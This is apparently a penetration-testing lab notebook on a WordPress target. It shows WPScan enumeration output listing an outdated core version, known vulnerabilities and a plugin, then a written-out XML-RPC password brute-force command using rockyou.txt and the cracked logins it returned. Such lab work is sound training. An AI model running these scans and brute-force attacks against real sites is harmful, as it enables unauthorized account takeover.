# Wpscan

## enumeration
```shell
wpscan --url http://154.57.164.82:31010 --enumerate --api-token cqsdqdAZQDSBsXg7VKh[...]


_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://154.57.164.82:31010/ [154.57.164.82]
[+] Started: Mon Apr 20 17:13:26 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://154.57.164.82:31010/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://154.57.164.82:31010/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://154.57.164.82:31010/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://154.57.164.82:31010/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.1.6 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://154.57.164.82:31010/feed/, <generator>https://wordpress.org/?v=5.1.6</generator>
 |  - http://154.57.164.82:31010/comments/feed/, <generator>https://wordpress.org/?v=5.1.6</generator>
 |
 | [!] 40 vulnerabilities identified:
 |
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 |     Fixed in: 5.1.9
 |     References:
 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
 |      - https://core.trac.wordpress.org/changeset/50717/
 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
 |
[...]
[i] Plugin(s) Identified:
[+] photo-gallery
 | Location: http://154.57.164.82:31010/wp-content/plugins/photo-gallery/
 | Last Updated: 2026-03-03T18:04:00.000Z
 | [!] The version is out of date, the latest version is 1.8.39
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
[...]
 | Version: 1.5.34 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://154.57.164.82:31010/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=1.5.34
 |  - http://154.57.164.82:31010/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.5.34
 |  - http://154.57.164.82:31010/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=1.5.34
 |  - http://154.57.164.82:31010/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.5.34
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://154.57.164.82:31010/wp-content/plugins/photo-gallery/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://154.57.164.82:31010/wp-content/plugins/photo-gallery/readme.txt
[...]
```

## Attacking WordPress Users

### WordPress User Bruteforce
```shell
┌──(root㉿kaljfou)-[~]
└─# wpscan --password-attack xmlrpc -t 20 --usernames admin,roger --passwords /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --url http://154.57.164.82:31010                  _______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://154.57.164.82:31010/ [154.57.164.82]
[+] Started: Mon Apr 20 17:34:26 2026

Interesting Finding(s):
[...]
[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - admin / sunshine1
[SUCCESS] - roger / lizard
Trying roger / lizard Time: 00:00:46 <                                                                                                            > (2540 / 28691322)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: sunshine1
 | Username: roger, Password: lizard
[...]
```